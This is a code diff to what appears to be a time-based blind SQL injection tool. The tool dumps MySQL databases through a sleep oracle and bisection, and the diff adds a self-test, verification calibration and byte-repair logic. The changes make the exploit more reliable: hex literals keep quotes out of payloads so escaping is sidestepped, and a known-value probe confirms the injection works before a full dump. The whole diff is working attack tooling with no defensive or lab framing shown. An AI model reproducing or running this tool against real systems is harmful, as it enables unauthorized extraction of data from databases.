@@ -51,6 +51,7 @@ THRESHOLD    = None
 GRAY_LO      = None
 GRAY_HI      = None
 BASE_P95     = None
+VERIFY_FORM  = None
 
 # One session reused for every request (across all threads). The cookie (if
 # set) rides along automatically in the Cookie header on each request.
@@ -184,7 +185,7 @@ if not CHOSEN:
 print(f"[+] Using wrapper: {CHOSEN}\n")
 
 # MySQL system schemas to skip when dumping "all" (still listed on screen)
-SKIP_DBS = ["information_schema", "performance_schema", "sys"]
+SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
 # --- Core oracle + extraction ----------------------------------------------
 def oracle(condition, tries=3):
@@ -249,30 +250,95 @@ def get_length(subquery):
 
 # --- Integrity check + repair ----------------------------------------------
 # One question confirms a whole segment, so a bad byte anywhere is caught for
-# the price of a single sleep. UNHEX keeps quotes out of the payload entirely,
-# and BINARY forces a byte-exact compare regardless of collation.
+# the price of a single sleep. The compare uses a bare 0x hex literal, so no
+# quotes ever enter the payload and nothing depends on how the app escapes
+# them. CAST(... AS BINARY) forces a byte-exact compare; the BINARY operator
+# is deprecated since MySQL 8.0.28 and gone in 8.4, so it is only a fallback.
+VERIFY_FORMS = [
+    "CAST(substring(({sub}),{start},{n}) AS BINARY)=0x{h}",
+    "substring(({sub}),{start},{n})=0x{h}",
+]
+
 def segment_ok(subquery, buf, lo, hi):
+    """None means the check itself is unavailable, not that the bytes differ."""
+    if VERIFY_FORM is None:
+        return None
     h = bytes(buf[lo:hi]).hex()
-    return oracle(f"BINARY(substring(({subquery}),{lo+1},{hi-lo}))=UNHEX('{h}')")
+    return oracle(VERIFY_FORM.format(sub=subquery, start=lo + 1, n=hi - lo, h=h))
 
 def _fix(subquery, buf, lo, hi):
     if segment_ok(subquery, buf, lo, hi):
         return 0
     if hi - lo == 1:
-        buf[lo] = bsearch(f"ascii(substring(({subquery}),{lo+1},1))", 0, 255)
+        v = bsearch(f"ascii(substring(({subquery}),{lo+1},1))", 0, 255)
+        # A re-read of 0 means every probe came back FALSE, which is what a
+        # dead oracle looks like - not a real NUL byte. Keep what we had.
+        if v:
+            buf[lo] = v
         return 1
     mid = (lo + hi) // 2
     return _fix(subquery, buf, lo, mid) + _fix(subquery, buf, mid, hi)
 
 def repair(subquery, buf):
     """Verify the dump against the DB; bisect to any bad byte and re-read it.
-    Returns (ok, number_of_bytes_fixed)."""
+    If the checker claims a large share of the string is wrong, the checker
+    itself is broken, so the original read is restored untouched rather than
+    overwritten. Returns (ok, bytes_fixed) where ok may be None = not checked."""
+    global VERIFY_FORM
+    if VERIFY_FORM is None:
+        return None, 0
+    original = list(buf)
+    budget = max(4, len(buf) // 4)
     fixed = 0
     for _ in range(3):
         if segment_ok(subquery, buf, 0, len(buf)):
             return True, fixed
         fixed += _fix(subquery, buf, 0, len(buf))
+        if fixed > budget:
+            buf[:] = original
+            VERIFY_FORM = None
+            print(f"\n[!] Verification claimed {fixed}/{len(buf)} bytes bad - "
+                  f"the check is unreliable on this target, disabling it.")
+            return None, 0
     return segment_ok(subquery, buf, 0, len(buf)), fixed
+
+# --- End-to-end self test --------------------------------------------------
+# Dumps a constant whose value is already known, so a silent oracle failure
+# surfaces here instead of as a plausible-looking but wrong table dump.
+# 0x4d7953514c is 'MySQL' - mixed case, so it exercises every range probe,
+# and a bare hex literal keeps quotes out of the payload.
+PROBE     = "SELECT 0x4d7953514c"
+PROBE_HEX = "4d7953514c"
+PROBE_VAL = "MySQL"
+
+def self_test():
+    n = get_length(PROBE)
+    if n != len(PROBE_VAL):
+        print(f"[!] Self test: expected length {len(PROBE_VAL)}, oracle said {n}.")
+        return False
+    buf = [extract_char(PROBE, i + 1) for i in range(n)]
+    got = bytes(buf).decode("utf-8", "replace")
+    if got != PROBE_VAL:
+        print(f"[!] Self test: expected {PROBE_VAL!r}, extracted {got!r}.")
+        return False
+    print(f"[+] Self test passed (read {PROBE_VAL!r} correctly).")
+    return True
+
+def calibrate_verify():
+    """Pick a compare form that actually works here, or switch verification
+    off. A checker that always says 'mismatch' is worse than none at all."""
+    global VERIFY_FORM
+    for form in VERIFY_FORMS:
+        VERIFY_FORM = form
+        hit  = oracle(form.format(sub=PROBE, start=1, n=5, h=PROBE_HEX))
+        miss = oracle(form.format(sub=PROBE, start=1, n=5, h="4d7953514d"))
+        if hit and not miss:
+            print(f"[+] Verification enabled "
+                  f"({'CAST' if 'CAST' in form else 'plain'} compare).")
+            return True
+    VERIFY_FORM = None
+    print("[!] No verification form worked - dumps will be marked [unverified].")
+    return False
 
 _print_lock = threading.Lock()
 def extract_string(subquery, label=None):
@@ -303,8 +369,10 @@ def extract_string(subquery, label=None):
         note = ""
         if fixed:
             note = f"  [repaired {fixed}]"
-        if not ok:
-            note += "  [UNVERIFIED]"
+        if ok is None:
+            note += "  [unverified]"
+        elif ok is False:
+            note += "  [MISMATCH - rerun with fewer threads]"
         sys.stdout.write(f"\r{label}{s}{note}{' ' * 8}\n")
     return s
 
@@ -401,6 +469,17 @@ def main():
 
 if __name__ == "__main__":
     try:
+        print("[*] Running end-to-end self test...")
+        if not self_test():
+            print("[!] The oracle is not returning reliable answers, so any")
+            print("    dump would be silently wrong. Things to try:")
+            print("    - lower the thread count (the box may drop or error")
+            print("      out on concurrent sleeping queries)")
+            print("    - set DELAY manually instead of auto")
+            print("    - confirm the payload template really breaks out")
+            sys.exit(1)
+        calibrate_verify()
+        print()
         main()
     except KeyboardInterrupt:
         print("\n[!] Interrupted.")
